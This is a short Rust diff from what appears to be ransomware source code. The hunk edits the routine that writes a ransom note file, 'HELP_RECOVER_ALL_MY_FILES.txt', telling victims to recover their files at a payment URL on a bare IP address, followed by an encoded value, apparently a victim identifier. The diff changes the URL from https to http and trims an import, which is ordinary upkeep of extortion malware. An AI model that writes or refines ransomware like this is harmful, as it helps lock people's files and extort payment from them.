@@ -5,7 +5,7 @@ use base64::{engine::general_purpose, Engine as _};
 use serde_json::json;
 use std::{
     env,
-    fs::{read_to_string, File, OpenOptions},
+    fs::{read_to_string, OpenOptions},
     io::Write,
     process::exit,
 };
@@ -71,7 +71,7 @@ async fn main() {
                 .open("HELP_RECOVER_ALL_MY_FILES.txt")
                 .unwrap();
             let message =
-                String::from("To recover your files please Go to https://82.66.179.79/userpay/")
+                String::from("To recover your files please Go to http://82.66.179.79/userpay/")
                     + &encoded;
             file.write_all(message.as_bytes()).unwrap();
 
